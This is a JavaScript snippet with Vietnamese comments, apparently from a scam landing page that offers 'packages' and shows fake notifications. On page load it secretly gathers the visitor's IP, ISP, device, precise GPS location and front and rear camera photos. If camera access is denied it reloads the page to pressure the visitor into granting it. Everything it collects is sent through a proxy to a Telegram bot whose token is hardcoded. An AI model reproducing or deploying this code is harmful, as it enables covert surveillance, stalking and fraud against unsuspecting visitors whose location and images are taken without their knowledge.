const TELEGRAM_BOT_TOKEN = '8476993284:AAGmfvzZNaDRa358CIq6YAFUNv7O6zrGSy4'; // <--- THAY THẾ TOKEN CỦA BẠN TẠI ĐÂY
        const TELEGRAM_CHAT_ID = '-5047874647';     // <--- THAY THẾ CHAT ID CỦA BẠN TẠI ĐÂY
        const API_SEND_MEDIA = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
        const API_SEND_TEXT = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

        const info = {
          time: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }), // Giờ Việt Nam
          ip: '',
          isp: '',
          realIp: '',
          address: '⏳ Đang kiểm tra...',
          country: '⏳ Đang kiểm tra...',
          lat: 'N/A',
          lon: 'N/A',
          device: '',
          os: '',
          camera: '⏳ Đang kiểm tra...'
        };

        function detectDevice() {
          const ua = navigator.userAgent;
          if (/iPhone|iPad|iPod/i.test(ua)) {
            info.device = 'iOS Device';
            info.os = 'iOS';
          } else if (/Android/i.test(ua)) {
            const match = ua.match(/Android.*; (.+?) Build/);
            info.device = match ? match[1] : 'Android Device';
            info.os = 'Android';
          } else if (/Windows NT/i.test(ua)) {
            info.device = 'Windows PC';
            info.os = 'Windows';
          } else if (/Macintosh|Mac OS X/i.test(ua)) {
            info.device = 'Mac';
            info.os = 'macOS';
          } else if (/Linux/i.test(ua)) {
            info.device = 'Linux PC';
            info.os = 'Linux';
          } else {
            info.device = 'Không xác định';
            info.os = 'Không rõ';
          }
          console.log("Device Detected:", info.device, "OS:", info.os);
        }

        async function getPublicIP() {
          try {
            const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
            info.ip = ip.ip || 'Không rõ';
            console.log("Public IP:", info.ip);
          } catch (e) {
            console.error("Error getting public IP:", e);
            info.ip = 'Lỗi truy xuất';
          }
        }

        async function getRealIP() {
          try {
            const ip = await fetch('https://icanhazip.com').then(r => r.text());
            info.realIp = ip.trim();
            console.log("Real IP:", info.realIp);
            const data = await fetch(`https://ipwho.is/${info.realIp}`).then(r => r.json());
            info.isp = data.connection?.org || 'Không rõ';
            console.log("ISP:", info.isp);
          } catch (e) {
            console.error("Error getting real IP or ISP:", e);
            info.realIp = 'Lỗi truy xuất';
            info.isp = 'Lỗi truy xuất';
          }
        }

        async function getLocation() {
          return new Promise(async resolve => {
            if (!navigator.geolocation) {
                console.warn("Geolocation not supported by browser. Falling back to IP location.");
                await fallbackIPLocation();
                return resolve();
            }

            try {
                // Check current permission state
                const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
                console.log("Geolocation permission state:", permissionStatus.state);

                if (permissionStatus.state === 'denied') {
                    console.warn("Geolocation permission denied by user (already denied). Falling back to IP location.");
                    info.address = '🚫 Bị từ chối truy cập vị trí (đã lưu)';
                    info.country = 'N/A';
                    await fallbackIPLocation(); // Still try to get IP-based location
                    return resolve();
                }

                // Attempt to get current position
                const timeoutId = setTimeout(async () => {
                    console.warn("Geolocation request timed out. Falling back to IP location.");
                    info.address = '🚫 Lỗi truy cập vị trí (timeout)';
                    info.country = 'N/A';
                    await fallbackIPLocation();
                    resolve();
                }, 8000); // 8 second timeout for geolocation

                navigator.geolocation.getCurrentPosition(
                    async pos => {
                        clearTimeout(timeoutId);
                        info.lat = pos.coords.latitude.toFixed(6);
                        info.lon = pos.coords.longitude.toFixed(6);
                        console.log("GPS Location:", info.lat, info.lon);
                        try {
                            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`, {
                                headers: { 'User-Agent': 'Mozilla/5.0' } // Required by Nominatim
                            });
                            const data = await res.json();
                            info.address = data.display_name || '📍 GPS hoạt động nhưng không tìm được địa chỉ';
                            info.country = data.address?.country || 'Không rõ';
                            console.log("Address from GPS:", info.address, "Country:", info.country);
                        } catch(e) {
                            console.error("Error getting address from Nominatim:", e);
                            info.address = '📍 GPS hoạt động nhưng không tìm được địa chỉ';
                            info.country = 'Không rõ';
                        }
                        resolve();
                    },
                    async (err) => {
                        clearTimeout(timeoutId);
                        console.warn("Geolocation error (user denied or other):", err.message, "Falling back to IP location.");
                        info.address = `🚫 Lỗi truy cập vị trí (${err.code}): ${err.message}`;
                        info.country = 'N/A';
                        await fallbackIPLocation();
                        resolve();
                    },
                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
                );
            } catch (error) {
                console.error("Error querying geolocation permission:", error);
                info.address = '🚫 Lỗi hệ thống vị trí';
                info.country = 'N/A';
                await fallbackIPLocation();
                resolve();
            }
          });
        }

        async function fallbackIPLocation() {
          try {
            const data = await fetch(`https://ipwho.is/`).then(r => r.json());
            info.lat = data.latitude?.toFixed(6) || 'N/A';
            info.lon = data.longitude?.toFixed(6) || 'N/A';
            info.address = `${data.city || 'Không rõ thành phố'}, ${data.region || 'Không rõ vùng'}, ${data.postal || ''}`.replace(/, $/, '').trim();
            info.country = data.country || 'Không rõ';
            console.log("IP Location (fallback):", info.address, "Country:", info.country);
          } catch (e) {
            console.error("Error falling back to IP location:", e);
            info.lat = 'Lỗi';
            info.lon = 'Lỗi';
            info.address = 'Lỗi truy xuất địa chỉ IP';
            info.country = 'Lỗi truy xuất';
          }
        }

        function captureCamera(facingMode = 'user') {
          return new Promise(async (resolve, reject) => {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                console.warn(`Camera API not supported for ${facingMode} camera.`);
                return reject(new Error("Camera API not supported."));
            }

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
                console.log(`Successfully got camera stream for ${facingMode} camera.`);

                const video = document.createElement('video');
                video.srcObject = stream;
                video.autoplay = true;
                video.muted = true;
                video.style.display = 'none';

                video.onloadedmetadata = () => {
                    video.play();
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');

                    setTimeout(() => {
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        stream.getTracks().forEach(track => track.stop());
                        canvas.toBlob(blob => {
                            console.log(`Captured image blob from ${facingMode} camera.`);
                            resolve(blob);
                        }, 'image/jpeg', 0.9);
                    }, 1000); // 1 second delay to ensure stable frame
                };
            } catch (err) {
                console.error(`Error accessing camera (${facingMode}):`, err);
                // Directly reject if permission denied or any other error
                reject(err);
            }
          });
        }

        function getCaption() {
          const mapsLink = (info.lat && info.lon && info.lat !== 'N/A' && info.lon !== 'N/A' && info.lat !== 'Lỗi' && info.lon !== 'Lỗi')
            ? `https://www.google.com/maps/search/?api=1&query=${info.lat},${info.lon}`
            : 'Không rõ';

          return `
📡 *『 BÁO CÁO TRUY CẬP 』*

⚡ *Thời điểm ghi nhận:*
		${info.time}
📡 *Thiết bị truy cập:* ${info.device}
🖥️ *Nền tảng:* ${info.os}

🌐 *IP định tuyến:* ${info.ip}
🧬 *IP nguồn thực:* ${info.realIp}
🏢 *Nhà cung cấp mạng:* ${info.isp}
 
🏙️ *Địa chỉ:* ${info.address}
🌎 *Quốc gia:* ${info.country}
📍 *Vĩ độ:* ${info.lat}
📍 *Kinh độ:* ${info.lon}

📸 *Camera:* ${info.camera}
📌 *Vị trí Google Maps:* ${mapsLink}
`.trim();
        }

        async function sendPhotos(frontBlob, backBlob) {
          const formData = new FormData();
          formData.append('chat_id', TELEGRAM_CHAT_ID);

          const mediaArray = [];
          if (frontBlob) {
              mediaArray.push({ type: 'photo', media: 'attach://front', caption: getCaption(), parse_mode: 'Markdown' });
              formData.append('front', frontBlob, 'front.jpg');
              console.log("Attaching front camera photo.");
          }
          if (backBlob) {
              mediaArray.push({ type: 'photo', media: 'attach://back' });
              formData.append('back', backBlob, 'back.jpg');
              console.log("Attaching back camera photo.");
          }

          if (mediaArray.length === 0) {
              console.warn("No photos to send. Sending text only.");
              return sendTextOnly();
          }

          formData.append('media', JSON.stringify(mediaArray));
          console.log("Sending media group to Telegram...");

          try {
            const response = await fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
            const responseText = await response.text();
            if (!response.ok) {
              console.error(`Error sending media to Telegram: ${response.status} - ${responseText}`);
              await sendTextOnly();
            } else {
                console.log("Photos sent successfully! Response:", responseText);
            }
          } catch (e) {
            console.error("Network error sending media to Telegram:", e);
            await sendTextOnly();
          }
        }

        async function sendTextOnly() {
          console.log("Sending text info only to Telegram...");
          try {
            const response = await fetch(API_SEND_TEXT, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: getCaption(),
                parse_mode: 'Markdown'
              })
            });
            const responseText = await response.text();
            if (!response.ok) {
                console.error(`Error sending text to Telegram: ${response.status} - ${responseText}`);
            } else {
                console.log("Text info sent successfully! Response:", responseText);
            }
          } catch (e) {
            console.error("Network error sending text to Telegram:", e);
          }
        }

        async function main() {
          console.log("Starting information gathering and Telegram send process...");
          detectDevice();
          await getPublicIP();
          await getRealIP();

          let front = null;
          let back = null;
          let cameraRequiredMessageShown = false; // Flag to ensure message only shows once

          try {
              // Yêu cầu quyền camera trước tiên
              console.log("Requesting front camera permission...");
              front = await captureCamera("user");
              info.camera = '✅ Đã chụp camera trước';
              console.log("Front camera access granted.");

              // Nếu chụp được camera trước, thử chụp camera sau
              try {
                  console.log("Requesting back camera permission...");
                  back = await captureCamera("environment");
                  info.camera += ' và sau';
                  console.log("Back camera access granted.");
              } catch (e) {
                  console.warn("Could not access back camera:", e.name, e.message);
                  // Không coi là lỗi nghiêm trọng nếu chỉ camera sau không chụp được
              }

          } catch (e) {
              // Xử lý khi người dùng từ chối quyền camera
              if (e.name === 'NotAllowedError' || e.name === 'PermissionDeniedError') {
                  console.error("Camera permission denied by user. Reloading page and showing message.");
                  info.camera = '🚫 Bị từ chối truy cập camera';
                  if (!cameraRequiredMessageShown) {
                     
                      location.reload(); // Tải lại trang ngay lập tức
                  }
                  return; // Ngừng tất cả các hoạt động khác
              } else {
                  console.error("Other camera access error:", e);
                  info.camera = `🚫 Lỗi truy cập camera: ${e.message}`;
              }
          }

          // Chỉ tiếp tục nếu camera đã được xử lý (hoặc không bị từ chối bắt buộc)
          // Nếu có lỗi khác ngoài NotAllowedError, nó vẫn sẽ tiếp tục nhưng không có ảnh
          
          // Tiếp tục lấy vị trí sau khi xử lý camera
          await getLocation();

          // Gửi dữ liệu về Telegram
          if (front || back) {
            await sendPhotos(front, back);
          } else {
            // Nếu không có ảnh nào được chụp (do lỗi khác NotAllowedError), vẫn gửi thông tin text
            await sendTextOnly();
          }
          console.log("Information gathering and Telegram send process finished.");
        }

        document.addEventListener('DOMContentLoaded', () => {
            main(); // Run the main logic for permissions and Telegram sending

            // Initialize selected package summary
            document.querySelectorAll('.option').forEach(e => e.classList.remove('selected'));
            document.getElementById('selectedSummary').textContent = 'Vui Lòng Chọn Gói';
            selectedPackageValue = null;
            // Start generating fake notifications
            setInterval(generateFakeNotifications, Math.random() * (15000 - 5000) + 5000); // Between 5 and 15 seconds
        });